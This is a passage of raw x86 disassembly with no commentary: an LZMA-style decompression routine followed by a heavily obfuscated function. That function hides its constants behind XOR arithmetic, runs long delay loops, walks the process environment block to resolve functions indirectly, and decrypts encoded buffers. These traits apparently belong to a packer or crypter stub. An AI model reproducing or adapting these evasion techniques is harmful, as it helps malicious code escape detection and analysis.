  416c81:	mov    edi,DWORD PTR [ebp-0x34]
  416c84:	shl    eax,0x3
  416c87:	push   0x8
  416c89:	pop    ecx
  416c8a:	push   0x8
  416c8c:	pop    esi
  416c8d:	lea    edi,[edi+eax*2+0x104]
  416c94:	jmp    0x416ca6
  416c96:	mov    edi,0x204
  416c9b:	add    edi,DWORD PTR [ebp-0x34]
  416c9e:	push   0x10
  416ca0:	pop    ecx
  416ca1:	mov    esi,0x100
  416ca6:	mov    DWORD PTR [ebp-0x1c],ecx
  416ca9:	sub    eax,eax
  416cab:	inc    eax
  416cac:	mov    ebp,edi
  416cae:	call   0x416e1b
  416cb3:	mov    ecx,eax
  416cb5:	sub    ecx,esi
  416cb7:	jb     0x416cac
  416cb9:	add    DWORD PTR [ebp-0x1c],ecx
  416cbc:	cmp    DWORD PTR [ebp-0x3c],0x4
  416cc0:	jae    0x416d76
  416cc6:	add    DWORD PTR [ebp-0x3c],0x7
  416cca:	mov    ecx,DWORD PTR [ebp-0x1c]
  416ccd:	cmp    ecx,0x4
  416cd0:	jb     0x416cd5
  416cd2:	push   0x3
  416cd4:	pop    ecx
  416cd5:	mov    edi,DWORD PTR [ebp-0x38]
  416cd8:	shl    ecx,0x6
  416cdb:	sub    eax,eax
  416cdd:	inc    eax
  416cde:	push   0x40
  416ce0:	pop    esi
  416ce1:	lea    edi,[edi+ecx*2+0x360]
  416ce8:	mov    ebp,edi
  416cea:	call   0x416e1b
  416cef:	mov    ecx,eax
  416cf1:	sub    ecx,esi
  416cf3:	jb     0x416ce8
  416cf5:	mov    DWORD PTR [ebp-0x18],ecx
  416cf8:	mov    DWORD PTR [ebp-0x24],ecx
  416cfb:	cmp    ecx,0x4
  416cfe:	jb     0x416d73
  416d00:	mov    esi,ecx
  416d02:	and    DWORD PTR [ebp-0x24],0x1
  416d06:	shr    esi,1
  416d08:	or     DWORD PTR [ebp-0x24],0x2
  416d0c:	dec    esi
  416d0d:	cmp    ecx,0xe
  416d10:	jae    0x416d2b
  416d12:	mov    eax,0x2af
  416d17:	sub    eax,ecx
  416d19:	mov    ecx,esi
  416d1b:	shl    BYTE PTR [ebp-0x24],cl
  416d1e:	add    eax,DWORD PTR [ebp-0x24]
  416d21:	shl    eax,1
  416d23:	add    eax,DWORD PTR [ebp-0x38]
  416d26:	mov    DWORD PTR [ebp-0x34],eax
  416d29:	jmp    0x416d58
  416d2b:	sub    esi,0x4
  416d2e:	call   0x416dd8
  416d33:	shr    ebx,1
  416d35:	shl    DWORD PTR [ebp-0x24],1
  416d38:	cmp    DWORD PTR [ebp-0x20],ebx
  416d3b:	jb     0x416d43
  416d3d:	inc    DWORD PTR [ebp-0x24]
  416d40:	sub    DWORD PTR [ebp-0x20],ebx
  416d43:	dec    esi
  416d44:	jne    0x416d2e
  416d46:	mov    eax,0x644
  416d4b:	add    eax,DWORD PTR [ebp-0x38]
  416d4e:	mov    DWORD PTR [ebp-0x34],eax
  416d51:	shl    DWORD PTR [ebp-0x24],0x4
  416d55:	push   0x4
  416d57:	pop    esi
  416d58:	sub    edi,edi
  416d5a:	inc    edi
  416d5b:	mov    eax,edi
  416d5d:	mov    ebp,DWORD PTR [ebp-0x34]
  416d60:	call   0x416e1b
  416d65:	test   al,0x1
  416d67:	je     0x416d6c
  416d69:	or     DWORD PTR [ebp-0x24],edi
  416d6c:	shl    edi,1
  416d6e:	dec    esi
  416d6f:	jne    0x416d5d
  416d71:	jmp    0x416d73
  416d73:	inc    DWORD PTR [ebp-0x24]
  416d76:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d79:	add    ecx,0x2
  416d7c:	mov    edi,DWORD PTR [ebp-0x4]
  416d7f:	mov    eax,edi
  416d81:	sub    eax,DWORD PTR [ebp+0x24]
  416d84:	cmp    DWORD PTR [ebp-0x24],eax
  416d87:	ja     0x416dd3
  416d89:	mov    esi,edi
  416d8b:	sub    esi,DWORD PTR [ebp-0x24]
  416d8e:	mov    edx,DWORD PTR [ebp+0x28]
  416d91:	lods   al,BYTE PTR ds:[esi]
  416d92:	stos   BYTE PTR es:[edi],al
  416d93:	cmp    edi,edx
  416d95:	jae    0x416d9a
  416d97:	dec    ecx
  416d98:	jne    0x416d91
  416d9a:	mov    DWORD PTR [ebp-0x4],edi
  416d9d:	movzx  esi,al
  416da0:	cmp    edi,DWORD PTR [ebp+0x28]
  416da3:	jb     0x416b04
  416da9:	call   0x416dd8
  416dae:	sub    eax,eax
  416db0:	lea    ebp,[esp+0x3c]
  416db4:	mov    edx,DWORD PTR [ebp+0x20]
  416db7:	mov    esi,DWORD PTR [ebp-0x8]
  416dba:	sub    esi,DWORD PTR [ebp+0x18]
  416dbd:	mov    DWORD PTR [edx],esi
  416dbf:	mov    edx,DWORD PTR [ebp+0x2c]
  416dc2:	mov    edi,DWORD PTR [ebp-0x4]
  416dc5:	sub    edi,DWORD PTR [ebp+0x24]
  416dc8:	mov    DWORD PTR [edx],edi
  416dca:	leave  
  416dcb:	pop    ebx
  416dcc:	pop    esi
  416dcd:	pop    edi
  416dce:	ret    0x1c
  416dd1:	pop    esi
  416dd2:	pop    eax
  416dd3:	sub    eax,eax
  416dd5:	inc    eax
  416dd6:	jmp    0x416db0
  416dd8:	cmp    ebx,0x1000000
  416dde:	jb     0x416de1
  416de0:	ret    
  416de1:	shl    ebx,0x8
  416de4:	push   esi
  416de5:	mov    esi,DWORD PTR [ebp-0x8]
  416de8:	cmp    esi,DWORD PTR [ebp+0x1c]
  416deb:	jae    0x416dd1
  416ded:	mov    eax,DWORD PTR [ebp-0x20]
  416df0:	shl    eax,0x8
  416df3:	lods   al,BYTE PTR ds:[esi]
  416df4:	mov    DWORD PTR [ebp-0x20],eax
  416df7:	mov    DWORD PTR [ebp-0x8],esi
  416dfa:	pop    esi
  416dfb:	ret    
  416dfc:	mov    ecx,DWORD PTR [ebp-0x3c]
  416dff:	movzx  eax,al
  416e02:	shl    ecx,0x4
  416e05:	add    eax,DWORD PTR [ebp-0x18]
  416e08:	add    eax,ecx
  416e0a:	jmp    0x416e12
  416e0c:	movzx  eax,al
  416e0f:	add    eax,DWORD PTR [ebp-0x3c]
  416e12:	mov    ebp,DWORD PTR [ebp-0x38]
  416e15:	lea    ebp,[ebp+eax*2+0x0]
  416e19:	sub    eax,eax
  416e1b:	lea    ebp,[ebp+eax*2+0x0]
  416e1f:	cmp    ebx,0x1000000
  416e25:	jae    0x416e43
  416e27:	mov    ecx,DWORD PTR [esp+0x38]
  416e2b:	shl    DWORD PTR [esp+0x20],0x8
  416e30:	cmp    ecx,DWORD PTR [esp+0x5c]
  416e34:	jae    0x416dd2
  416e36:	mov    dl,BYTE PTR [ecx]
  416e38:	inc    DWORD PTR [esp+0x38]
  416e3c:	shl    ebx,0x8
  416e3f:	mov    BYTE PTR [esp+0x20],dl
  416e43:	mov    ecx,ebx
  416e45:	movzx  edx,WORD PTR [ebp+0x0]
  416e49:	shr    ecx,0xb
  416e4c:	imul   ecx,edx
  416e4f:	cmp    DWORD PTR [esp+0x20],ecx
  416e53:	jae    0x416e6c
  416e55:	mov    ebx,ecx
  416e57:	mov    ecx,0x800
  416e5c:	sub    ecx,edx
  416e5e:	shr    ecx,0x5
  416e61:	add    WORD PTR [ebp+0x0],cx
  416e65:	add    eax,eax
  416e67:	lea    ebp,[esp+0x40]
  416e6b:	ret    
  416e6c:	shr    edx,0x5
  416e6f:	sub    DWORD PTR [esp+0x20],ecx
  416e73:	sub    ebx,ecx
  416e75:	sub    WORD PTR [ebp+0x0],dx
  416e79:	add    eax,eax
  416e7b:	add    eax,0x1
  416e7e:	lea    ebp,[esp+0x40]
  416e82:	ret    
  416e83:	push   ebp
  416e84:	mov    ebp,esp
  416e86:	sub    esp,0x104
  416e8c:	push   ebx
  416e8d:	push   esi
  416e8e:	push   edi
  416e8f:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  416e96:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  416e9d:	mov    eax,DWORD PTR [ebp+0x8]
  416ea0:	mov    DWORD PTR [ebp+0x8],eax
  416ea3:	mov    ecx,DWORD PTR [ebp-0x14]
  416ea6:	mov    ebx,0x751089b
  416eab:	xor    ecx,ebx
  416ead:	mov    eax,0x3272e2
  416eb2:	add    ecx,eax
  416eb4:	mov    DWORD PTR [ebp-0x2c],ecx
  416eb7:	mov    ecx,DWORD PTR [ebp-0x14]
  416eba:	xor    ecx,ebx
  416ebc:	add    ecx,eax
  416ebe:	mov    DWORD PTR [ebp-0x3c],ecx
  416ec1:	mov    ecx,DWORD PTR [ebp-0x14]
  416ec4:	xor    ecx,ebx
  416ec6:	add    ecx,eax
  416ec8:	mov    DWORD PTR [ebp-0x40],ecx
  416ecb:	mov    ecx,DWORD PTR [ebp-0x14]
  416ece:	xor    ecx,ebx
  416ed0:	add    ecx,eax
  416ed2:	mov    DWORD PTR [ebp-0xa0],ecx
  416ed8:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  416edf:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  416ee6:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  416eed:	push   0x25
  416eef:	pop    ecx
  416ef0:	mov    DWORD PTR [ebp-0x34],ecx
  416ef3:	mov    DWORD PTR [ebp-0x34],ecx
  416ef6:	push   0x65
  416ef8:	pop    ecx
  416ef9:	mov    DWORD PTR [ebp-0x34],ecx
  416efc:	mov    DWORD PTR [ebp-0x34],ecx
  416eff:	mov    DWORD PTR [ebp-0x34],0x4d
  416f06:	mov    DWORD PTR [ebp-0x34],0x43
  416f0d:	mov    ecx,DWORD PTR [ebp-0x14]
  416f10:	xor    ecx,ebx
  416f12:	add    ecx,eax
  416f14:	mov    DWORD PTR [ebp-0x34],ecx
  416f17:	mov    ecx,DWORD PTR [ebp-0x14]
  416f1a:	xor    ecx,ebx
  416f1c:	add    ecx,eax
  416f1e:	mov    DWORD PTR [ebp-0x34],ecx
  416f21:	mov    DWORD PTR [ebp-0x28],0x257
  416f28:	mov    DWORD PTR [ebp-0x20],0x35
  416f2f:	mov    DWORD PTR [ebp-0x10],0x79
  416f36:	lea    edi,[ebp-0xe4]
  416f3c:	lea    esi,[ebp-0x104]
  416f42:	call   0x417b5e
  416f47:	dec    DWORD PTR [ebp-0x10]
  416f4a:	jne    0x416f36
  416f4c:	dec    DWORD PTR [ebp-0x20]
  416f4f:	jne    0x416f2f
  416f51:	dec    DWORD PTR [ebp-0x28]
  416f54:	jne    0x416f28
  416f56:	mov    DWORD PTR [ebp-0x28],0x400d
  416f5d:	mov    eax,DWORD PTR [ebp-0x14]
  416f60:	xor    eax,ebx
  416f62:	mov    esi,0x3272e2
  416f67:	add    eax,esi
  416f69:	mov    DWORD PTR [ebp-0x8],eax
  416f6c:	mov    eax,DWORD PTR [ebp-0x14]
  416f6f:	and    DWORD PTR [ebp-0x94],0x0
  416f76:	xor    eax,ebx
  416f78:	add    eax,esi
  416f7a:	mov    DWORD PTR [ebp-0x38],eax
  416f7d:	mov    eax,fs:0x18
  416f83:	mov    DWORD PTR [ebp-0x94],eax
  416f89:	mov    eax,DWORD PTR [eax+0x30]
  416f8c:	mov    DWORD PTR [ebp-0x98],eax
  416f92:	mov    eax,DWORD PTR [eax+0xc]
  416f95:	mov    DWORD PTR [ebp-0xc0],eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x8]
  416f9e:	lea    ecx,[ebp-0x94]
  416fa4:	mov    DWORD PTR [eax+0x1a0],ecx
  416faa:	mov    eax,DWORD PTR [ebp+0x8]
  416fad:	lea    ecx,[ebp-0x98]
  416fb3:	mov    DWORD PTR [eax+0x1a4],ecx
  416fb9:	mov    eax,DWORD PTR [ebp+0x8]
  416fbc:	push   DWORD PTR [ebp+0x8]
  416fbf:	lea    ecx,[ebp-0xc0]
  416fc5:	mov    DWORD PTR [eax+0x1a8],ecx
  416fcb:	call   0x419344
  416fd0:	mov    ecx,DWORD PTR [ebp-0x14]
  416fd3:	xor    ecx,ebx
  416fd5:	add    ecx,esi
  416fd7:	cmp    ecx,eax
  416fd9:	je     0x4172b6
  416fdf:	mov    eax,DWORD PTR [ebp+0x8]
  416fe2:	mov    eax,DWORD PTR [eax+0x194]
  416fe8:	mov    ecx,DWORD PTR [eax]
  416fea:	mov    eax,DWORD PTR [ebp+0x8]
  416fed:	mov    eax,DWORD PTR [eax+0x194]
  416ff3:	mov    eax,DWORD PTR [eax]
  416ff5:	add    eax,DWORD PTR [ecx+0x3c]
  416ff8:	mov    ecx,DWORD PTR [ebp+0x8]
  416ffb:	mov    ecx,DWORD PTR [ecx+0x1d8]
  417001:	lea    edx,[ebp-0xc4]
  417007:	push   edx
  417008:	mov    edx,DWORD PTR [ebp+0x8]
  41700b:	mov    edx,DWORD PTR [edx+0x18c]
  417011:	mov    edx,DWORD PTR [edx]
  417013:	add    edx,DWORD PTR [eax+0x88]
  417019:	push   0x4
  41701b:	push   DWORD PTR [eax+0x8c]
  417021:	push   edx
  417022:	call   DWORD PTR [ecx+0x1c]
  417025:	push   DWORD PTR [ebp+0x8]
  417028:	mov    edi,DWORD PTR [ebp+0x8]
  41702b:	mov    eax,DWORD PTR [ebp+0x8]
  41702e:	mov    edx,DWORD PTR [eax+0x1b8]
  417034:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41703b:	mov    DWORD PTR [ebp-0x64],0x50c011f
  417042:	mov    WORD PTR [ebp-0x60],0x7c3d
  417048:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  417052:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41705c:	mov    DWORD PTR [ebp-0x88],0x221d040c
  417066:	mov    DWORD PTR [ebp-0x84],0xe190109
  417070:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  417077:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41707e:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  417085:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41708c:	mov    DWORD PTR [ebp-0x70],0xe190109
  417093:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41709a:	call   0x419373
  41709f:	push   eax
  4170a0:	mov    eax,DWORD PTR [ebp+0x8]
  4170a3:	mov    eax,DWORD PTR [eax+0x1a8]
  4170a9:	push   DWORD PTR [eax]
  4170ab:	call   0x419014
  4170b0:	test   eax,eax
  4170b2:	jne    0x417104
  4170b4:	mov    eax,DWORD PTR [ebp+0x8]
  4170b7:	mov    eax,DWORD PTR [eax+0x1d8]
  4170bd:	mov    edi,DWORD PTR [ebp+0x8]
  4170c0:	add    eax,0x4
  4170c3:	mov    DWORD PTR [ebp-0x24],eax
  4170c6:	mov    eax,DWORD PTR [ebp+0x8]
  4170c9:	mov    edx,DWORD PTR [eax+0x1b8]
  4170cf:	call   0x419373
  4170d4:	push   eax
  4170d5:	mov    eax,DWORD PTR [ebp-0x24]
  4170d8:	call   DWORD PTR [eax]
  4170da:	test   eax,eax
  4170dc:	jne    0x417104
  4170de:	mov    eax,DWORD PTR [ebp+0x8]
  4170e1:	mov    eax,DWORD PTR [eax+0x1d8]
  4170e7:	mov    edi,DWORD PTR [ebp+0x8]
  4170ea:	add    eax,0x10
  4170ed:	mov    DWORD PTR [ebp-0x24],eax
  4170f0:	mov    eax,DWORD PTR [ebp+0x8]
  4170f3:	mov    edx,DWORD PTR [eax+0x1b8]
  4170f9:	call   0x419373
  4170fe:	push   eax
  4170ff:	mov    eax,DWORD PTR [ebp-0x24]
  417102:	call   DWORD PTR [eax]
  417104:	mov    eax,DWORD PTR [ebp-0x14]
  417107:	mov    ecx,DWORD PTR [ebp-0x28]
  41710a:	xor    eax,ebx
  41710c:	add    eax,esi
  41710e:	cmp    eax,ecx
  417110:	je     0x41728f
  417116:	mov    eax,DWORD PTR [ebp-0x18]
  417119:	xor    eax,ebx
  41711b:	mov    ecx,0xffcd8d1e
  417120:	sub    ecx,eax
  417122:	add    ecx,DWORD PTR [ebp-0x28]
  417125:	mov    eax,DWORD PTR [ebp-0x8]
  417128:	cmp    eax,ecx
  41712a:	ja     0x41728f
  417130:	mov    DWORD PTR [ebp-0x20],0x0
  417137:	push   DWORD PTR [ebp+0x8]
  41713a:	mov    edi,DWORD PTR [ebp+0x8]
  41713d:	mov    eax,DWORD PTR [ebp+0x8]
  417140:	mov    edx,DWORD PTR [eax+0x1b4]
  417146:	call   0x419373
  41714b:	push   eax
  41714c:	mov    eax,DWORD PTR [ebp+0x8]
  41714f:	mov    eax,DWORD PTR [eax+0x1a8]
  417155:	push   DWORD PTR [eax]
  417157:	call   0x419014
  41715c:	mov    ecx,DWORD PTR [ebp+0x8]
  41715f:	mov    ecx,DWORD PTR [ecx+0x19c]
  417165:	mov    DWORD PTR [ecx],eax
  417167:	mov    eax,DWORD PTR [ebp+0x8]
  41716a:	mov    edi,DWORD PTR [eax+0x1d8]
  417170:	mov    esi,DWORD PTR [ebp+0x8]
  417173:	xor    eax,eax
  417175:	lea    edx,[ebp-0x7c]
  417178:	call   0x4193a9
  41717d:	push   eax
  41717e:	mov    eax,DWORD PTR [ebp+0x8]
  417181:	mov    eax,DWORD PTR [eax+0x19c]
  417187:	push   DWORD PTR [eax]
  417189:	call   DWORD PTR [edi+0x8]
  41718c:	mov    DWORD PTR [ebp-0x24],eax
  41718f:	mov    eax,DWORD PTR [ebp+0x8]
  417192:	mov    edi,DWORD PTR [eax+0x1d8]
  417198:	mov    esi,DWORD PTR [ebp+0x8]
  41719b:	xor    eax,eax
  41719d:	lea    edx,[ebp-0x90]
  4171a3:	call   0x4193a9
  4171a8:	push   eax
  4171a9:	mov    eax,DWORD PTR [ebp+0x8]
  4171ac:	mov    eax,DWORD PTR [eax+0x19c]
  4171b2:	push   DWORD PTR [eax]
  4171b4:	call   DWORD PTR [edi+0x8]
  4171b7:	and    DWORD PTR [ebp-0x1c],0x0
  4171bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4171be:	and    eax,0x7
  4171c1:	add    eax,0x31
  4171c4:	push   eax
  4171c5:	call   DWORD PTR [ebp-0x24]
  4171c8:	test   eax,eax
  4171ca:	jne    0x4171d1
  4171cc:	and    DWORD PTR [ebp-0x10],eax
  4171cf:	jmp    0x4171f9
  4171d1:	mov    eax,DWORD PTR [ebp+0x8]
  4171d4:	mov    edi,DWORD PTR [eax+0x1d8]
  4171da:	mov    esi,DWORD PTR [ebp+0x8]
  4171dd:	xor    eax,eax
  4171df:	lea    edx,[ebp-0x68]
  4171e2:	call   0x4193a9
  4171e7:	push   eax
  4171e8:	mov    eax,DWORD PTR [ebp+0x8]
  4171eb:	mov    eax,DWORD PTR [eax+0x198]
  4171f1:	push   DWORD PTR [eax]
  4171f3:	call   DWORD PTR [edi+0x8]
  4171f6:	mov    DWORD PTR [ebp-0x10],eax
  4171f9:	inc    DWORD PTR [ebp-0x1c]
  4171fc:	cmp    DWORD PTR [ebp-0x1c],0x10
  417200:	jb     0x4171bb
  417202:	mov    eax,DWORD PTR [ebp-0x18]
  417205:	mov    esi,DWORD PTR [ebp+0x8]
  417208:	xor    eax,ebx
  41720a:	mov    edi,0x3272e2
  41720f:	add    eax,edi
  417211:	lea    edx,[ebp-0xe4]
  417217:	call   0x4193a9
  41721c:	push   eax
  41721d:	mov    eax,DWORD PTR [ebp-0x14]
  417220:	mov    esi,DWORD PTR [ebp+0x8]
  417223:	xor    eax,ebx
  417225:	add    eax,edi
  417227:	lea    edx,[ebp-0x104]
  41722d:	call   0x4193a9
  417232:	push   eax
  417233:	call   DWORD PTR [ebp-0x10]
  417236:	mov    ecx,DWORD PTR [ebp-0x14]
  417239:	xor    ecx,ebx
  41723b:	add    ecx,edi
  41723d:	cmp    ecx,eax
  41723f:	jne    0x417248
  417241:	mov    DWORD PTR [ebp-0x20],0x1
  417248:	mov    eax,DWORD PTR [ebp-0x18]
  41724b:	mov    ecx,DWORD PTR [ebp-0x8]
  41724e:	xor    eax,ebx
  417250:	lea    eax,[eax+ecx*1+0x3272e2]
  417257:	mov    DWORD PTR [ebp-0x8],eax
  41725a:	mov    eax,DWORD PTR [ebp-0x20]
  41725d:	test   eax,eax
  41725f:	je     0x417273
  417261:	mov    eax,DWORD PTR [ebp-0x18]
  417264:	mov    ecx,DWORD PTR [ebp-0x38]
  417267:	xor    eax,ebx
  417269:	lea    eax,[eax+ecx*1+0x3272e2]
  417270:	mov    DWORD PTR [ebp-0x38],eax
  417273:	mov    eax,DWORD PTR [ebp-0x18]
  417276:	xor    eax,ebx
  417278:	mov    ecx,0xffcd8d1e
  41727d:	sub    ecx,eax
  41727f:	add    ecx,DWORD PTR [ebp-0x28]
  417282:	mov    eax,DWORD PTR [ebp-0x8]
  417285:	cmp    eax,ecx
  417287:	jbe    0x417130
  41728d:	mov    esi,edi
  41728f:	mov    eax,DWORD PTR [ebp-0x38]
  417292:	mov    ecx,DWORD PTR [ebp-0x8]
  417295:	cmp    ecx,eax
  417297:	jne    0x4172aa
  417299:	push   DWORD PTR [ebp+0x8]
  41729c:	lea    eax,[ebp-0x3c]
  41729f:	push   eax
  4172a0:	call   0x419e21
  4172a5:	mov    DWORD PTR [ebp-0x2c],eax
  4172a8:	jmp    0x4172b6
  4172aa:	mov    eax,DWORD PTR [ebp-0x2c]
  4172ad:	mov    ecx,DWORD PTR [ebp-0x18]
  4172b0:	xor    ecx,ebx
  4172b2:	add    ecx,esi
  4172b4:	xor    DWORD PTR [eax],ecx
  4172b6:	mov    eax,DWORD PTR [ebp-0x14]
  4172b9:	mov    ecx,DWORD PTR [ebp-0x2c]
  4172bc:	xor    eax,ebx
  4172be:	add    eax,esi
  4172c0:	cmp    eax,ecx
  4172c2:	je     0x417a3c
  4172c8:	mov    eax,DWORD PTR [ebp-0x14]
  4172cb:	mov    ecx,DWORD PTR [ebp-0x3c]
  4172ce:	xor    eax,ebx
  4172d0:	add    eax,esi
  4172d2:	cmp    eax,ecx
  4172d4:	je     0x417a3c
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	xor    eax,ebx
  4172df:	add    eax,esi
  4172e1:	jmp    0x4172ff
  4172e3:	mov    edi,DWORD PTR [ebp-0x2c]
  4172e6:	mov    cl,al
  4172e8:	and    cl,0x1f
  4172eb:	or     dl,0xff
  4172ee:	sub    dl,cl
  4172f0:	add    BYTE PTR [edi+eax*1],dl
  4172f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4172f6:	xor    ecx,ebx
  4172f8:	lea    eax,[eax+ecx*1+0x3272e2]
  4172ff:	mov    ecx,DWORD PTR [ebp-0x3c]
  417302:	cmp    eax,ecx
  417304:	jb     0x4172e3
  417306:	mov    eax,DWORD PTR [ebp-0x3c]
  417309:	mov    DWORD PTR [ebp-0x28],eax
  41730c:	mov    eax,DWORD PTR [ebp-0x2c]
  41730f:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  417316:	mov    DWORD PTR [ebp-0xbc],eax
  41731c:	mov    edi,0xf89c8584
  417321:	mov    DWORD PTR [ebp-0x30],edi
  417324:	mov    eax,DWORD PTR [ebp-0x38]
  417327:	xor    eax,ebx
  417329:	add    eax,esi
  41732b:	mov    DWORD PTR [ebp-0xc],eax
  41732e:	mov    eax,DWORD PTR [ebp-0x38]
  417331:	xor    eax,ebx
  417333:	add    eax,esi
  417335:	mov    DWORD PTR [ebp-0x8],eax
  417338:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41733f:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  417346:	mov    eax,DWORD PTR [ebp-0x38]
  417349:	mov    ecx,DWORD PTR [ebp-0x28]
  41734c:	xor    eax,ebx
  41734e:	add    eax,esi
  417350:	cmp    ecx,eax
  417352:	je     0x417551
  417358:	jmp    0x41752d
  41735d:	mov    ecx,DWORD PTR [ebp-0xc]
  417360:	mov    eax,DWORD PTR [ebp-0x28]
  417363:	sub    eax,ecx
  417365:	mov    ecx,DWORD PTR [ebp-0x48]
  417368:	xor    ecx,ebx
  41736a:	add    ecx,esi
  41736c:	xor    edx,edx
  41736e:	div    ecx
  417370:	mov    DWORD PTR [ebp-0x8],eax
  417373:	mov    eax,DWORD PTR [ebp-0x54]
  417376:	mov    ecx,DWORD PTR [ebp-0x8]
  417379:	xor    eax,ebx
  41737b:	add    eax,esi
  41737d:	cmp    ecx,eax
  41737f:	jbe    0x41738b
  417381:	mov    eax,DWORD PTR [ebp-0x54]
  417384:	xor    eax,ebx
  417386:	add    eax,esi
  417388:	mov    DWORD PTR [ebp-0x8],eax
  41738b:	mov    eax,DWORD PTR [ebp-0x48]
  41738e:	mov    ecx,DWORD PTR [ebp-0x8]
  417391:	xor    eax,ebx
  417393:	add    eax,esi
  417395:	imul   eax,ecx
  417398:	mov    DWORD PTR [ebp-0x8],eax
  41739b:	mov    eax,DWORD PTR [ebp-0x38]
  41739e:	mov    ecx,DWORD PTR [ebp-0x8]
  4173a1:	xor    eax,ebx
  4173a3:	add    eax,esi
  4173a5:	cmp    ecx,eax
  4173a7:	je     0x41751b
  4173ad:	mov    eax,DWORD PTR [ebp-0x8]
  4173b0:	mov    DWORD PTR [ebp-0x10],eax
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	add    eax,DWORD PTR [ebp-0xbc]
  4173bc:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  4173c3:	mov    DWORD PTR [ebp-0x20],edi
  4173c6:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  4173d0:	mov    DWORD PTR [ebp-0x8],eax
  4173d3:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  4173da:	mov    DWORD PTR [ebp-0x1c],edi
  4173dd:	mov    eax,DWORD PTR [ebp-0x24]
  4173e0:	xor    eax,ebx
  4173e2:	add    eax,esi
  4173e4:	jmp    0x4174da
  4173e9:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  4173f3:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  4173fd:	mov    eax,DWORD PTR [ebp-0x1c]
  417400:	mov    ecx,DWORD PTR [ebp-0x44]
  417403:	xor    eax,ebx
  417405:	add    eax,esi
  417407:	imul   eax,ecx
  41740a:	mov    ecx,DWORD PTR [ebp-0x8]
  41740d:	mov    al,BYTE PTR [eax+ecx*1]
  417410:	mov    BYTE PTR [ebp-0x2],al
  417413:	mov    eax,DWORD PTR [ebp-0x1c]
  417416:	mov    ecx,DWORD PTR [ebp-0x44]
  417419:	xor    eax,ebx
  41741b:	add    eax,esi
  41741d:	imul   eax,ecx
  417420:	mov    ecx,DWORD PTR [ebp-0xa8]
  417426:	xor    ecx,ebx
  417428:	add    eax,ecx
  41742a:	mov    ecx,DWORD PTR [ebp-0x8]
  41742d:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  417435:	mov    ecx,DWORD PTR [ebp-0xb0]
  41743b:	xor    ecx,ebx
  41743d:	lea    eax,[ecx+eax*1+0x3272e2]
  417444:	movzx  ecx,BYTE PTR [ebp-0x2]
  417448:	xor    ecx,eax
  41744a:	mov    BYTE PTR [ebp-0x2],cl
  41744d:	mov    al,BYTE PTR [ebp-0x2]
  417450:	mov    ecx,DWORD PTR [ebp-0x1c]
  417453:	mov    edx,DWORD PTR [ebp-0x44]
  417456:	xor    ecx,ebx
  417458:	add    ecx,esi
  41745a:	imul   ecx,edx
  41745d:	mov    edx,DWORD PTR [ebp-0x8]
  417460:	mov    BYTE PTR [ecx+edx*1],al
  417463:	mov    eax,DWORD PTR [ebp-0x1c]
  417466:	mov    ecx,DWORD PTR [ebp-0x44]
  417469:	xor    eax,ebx
  41746b:	add    eax,esi
  41746d:	imul   eax,ecx
  417470:	mov    ecx,DWORD PTR [ebp-0x8]
  417473:	mov    al,BYTE PTR [eax+ecx*1]
  417476:	mov    BYTE PTR [ebp-0x2],al
  417479:	mov    eax,DWORD PTR [ebp-0x1c]
  41747c:	mov    ecx,DWORD PTR [ebp-0x44]
  41747f:	xor    eax,ebx
  417481:	add    eax,esi
  417483:	imul   eax,ecx
  417486:	mov    ecx,DWORD PTR [ebp-0x20]
  417489:	xor    ecx,ebx
  41748b:	add    eax,ecx
  41748d:	mov    ecx,DWORD PTR [ebp-0x8]
  417490:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  417498:	mov    ecx,DWORD PTR [ebp-0xb8]
  41749e:	xor    ecx,ebx
  4174a0:	lea    eax,[ecx+eax*1+0x3272e2]
  4174a7:	movzx  ecx,BYTE PTR [ebp-0x2]
  4174ab:	xor    ecx,eax
  4174ad:	mov    BYTE PTR [ebp-0x2],cl
  4174b0:	mov    al,BYTE PTR [ebp-0x2]
  4174b3:	mov    ecx,DWORD PTR [ebp-0x1c]
  4174b6:	mov    edx,DWORD PTR [ebp-0x44]
  4174b9:	xor    ecx,ebx
  4174bb:	add    ecx,esi
  4174bd:	imul   ecx,edx
  4174c0:	mov    edx,DWORD PTR [ebp-0x8]
  4174c3:	mov    BYTE PTR [ecx+edx*1],al
  4174c6:	mov    eax,DWORD PTR [ebp-0x34]
  4174c9:	mov    ecx,DWORD PTR [ebp-0x20]
  4174cc:	xor    eax,ebx
  4174ce:	xor    ecx,ebx
  4174d0:	add    eax,esi
  4174d2:	add    ecx,esi
  4174d4:	imul   eax,ecx
  4174d7:	add    eax,DWORD PTR [ebp-0x44]
  4174da:	mov    DWORD PTR [ebp-0x44],eax
  4174dd:	mov    eax,DWORD PTR [ebp-0x44]
  4174e0:	mov    ecx,DWORD PTR [ebp-0x10]
  4174e3:	cmp    ecx,eax
  4174e5:	jb     0x4173e9
  4174eb:	mov    eax,DWORD PTR [ebp-0x20]
  4174ee:	mov    ecx,DWORD PTR [ebp-0x10]
  4174f1:	xor    eax,ebx
  4174f3:	add    eax,esi
  4174f5:	imul   eax,ecx
